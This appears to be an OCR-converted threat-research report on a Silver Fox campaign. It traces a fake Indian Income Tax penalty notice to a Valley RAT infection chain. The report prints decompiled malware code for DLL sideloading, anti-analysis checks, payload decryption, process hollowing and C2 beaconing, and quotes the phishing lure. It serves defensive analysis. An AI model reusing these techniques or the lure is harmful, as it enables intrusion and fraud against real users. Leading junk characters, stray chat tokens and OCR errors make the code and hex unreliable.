/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, 